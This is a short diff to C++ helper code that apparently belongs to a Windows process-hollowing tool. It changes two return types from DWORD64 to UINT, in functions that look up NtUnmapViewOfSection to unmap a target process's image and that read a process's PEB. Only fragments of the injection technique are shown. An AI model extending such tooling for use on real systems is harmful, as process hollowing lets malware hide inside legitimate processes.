@@ -1,6 +1,6 @@
 #include "utils.h"
 
-inline DWORD64 Utils::Error(const std::string& errMsg) {
+inline UINT Utils::Error(const std::string& errMsg) {
 	std::cout << "[-] " << errMsg << ":" << GetLastError() << "\n";
 	return EXIT_FAILURE;
 }
@@ -21,7 +21,7 @@ std::optional<LPVOID> Utils::readProcessMemory(HANDLE hProcess, DWORD64 pebAddr)
 
 }
 
-DWORD64 Utils::unmapProcess(HMODULE dll, HANDLE hProcess, LPVOID imageBaseAddr) {
+UINT Utils::unmapProcess(HMODULE dll, HANDLE hProcess, LPVOID imageBaseAddr) {
 	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(dll, "NtUnmapViewOfSection");
 	if (!NtUnmapViewOfSection) {
 		return Utils::Error("Failed find function NtUnmapViewOfSection");
